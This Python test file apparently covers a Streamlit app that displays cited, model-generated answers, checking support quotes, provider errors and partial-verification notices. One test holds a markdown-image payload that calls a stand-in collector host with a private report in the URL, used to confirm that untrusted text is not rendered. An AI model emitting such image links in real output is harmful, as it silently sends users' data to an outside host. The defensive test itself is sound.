"""The generated-answer view exposes the model's actual support passages."""
import json

from streamlit.testing.v1 import AppTest


def test_generated_answer_displays_exact_support_and_model():
    record = {
        'question': 'Are cached resources shared?', 'status': 'evidence_found',
        'answer': 'Cached resources are shared across users. [S1]',
        'metrics': {'mode': 'hybrid', 'latency_ms': 1250, 'generation_mode': 'cited_model_synthesis',
                    'generation_returned_model': 'test-model'},
        'evidence': [{'citation_id': 'S1', 'title': 'Resource cache', 'source_id': 'doc-cache',
                      'kind': 'documentation', 'quote': 'An independently selected retrieval excerpt.',
                      'support_quotes': ['Cached resources are shared across users and sessions.'],
                      'url': 'https://docs.example.test/cache'}],
    }
    script = 'from app import render_result\nrender_result(' + repr(record) + ')'
    app = AppTest.from_string(script, default_timeout=20).run()
    assert not app.exception
    assert any('test-model' in c.value for c in app.caption)
    assert any('Cached resources are shared across users and sessions.' in t.value for t in app.text)
    assert any('Exact passages cited' in m.value for m in app.markdown)


def test_provider_failure_remains_visible_with_evidence():
    record = {'question': 'A report', 'status': 'evidence_found', 'answer': 'Extracted evidence.',
              'metrics': {'mode': 'keyword', 'latency_ms': 10,
                          'generation_mode': 'extracted_evidence_provider_unavailable',
                          'generation_error': 'Provider returned HTTP 429; showing evidence.'},
              'evidence': []}
    app = AppTest.from_string('from app import render_result\nrender_result(' + repr(record) + ')', default_timeout=20).run()
    assert not app.exception
    assert any('HTTP 429' in warning.value for warning in app.warning)


def test_partial_verified_answer_discloses_removed_claims():
    record = {'question': 'A report', 'status': 'evidence_found', 'answer': 'A supported portion. [S1]',
              'metrics': {'mode': 'keyword', 'latency_ms': 100,
                          'generation_mode': 'cited_model_synthesis',
                          'generation_verification': {'attempted': True, 'accepted_claims': 1, 'rejected_claims': 2}},
              'evidence': []}
    app = AppTest.from_string('from app import render_result\nrender_result(' + repr(record) + ')', default_timeout=20).run()
    assert not app.exception
    assert any('Partial answer' in warning.value for warning in app.warning)
    assert any('1 retained, 2 removed' in caption.value for caption in app.caption)


def test_untrusted_followup_and_issue_title_are_plain_text():
    payload = '![diagnostic](https://collector.example.invalid/pixel?report=private-report)'
    record = {'question': 'A report', 'status': 'needs_details', 'answer': 'More details are needed.',
              'metrics': {'mode': 'keyword', 'latency_ms': 10, 'generation_mode': 'workflow_needs_details'},
              'missing_details': [payload],
              'related_issues': [{'title': payload, 'url': 'https://github.com/streamlit/streamlit/issues/1'}],
              'evidence': []}
    app = AppTest.from_string('from app import render_result\nrender_result(' + repr(record) + ')', default_timeout=20).run()
    assert not app.exception
    assert any(payload in text.value for text in app.text)
    assert not any('collector.example.invalid' in item.value for item in app.markdown)
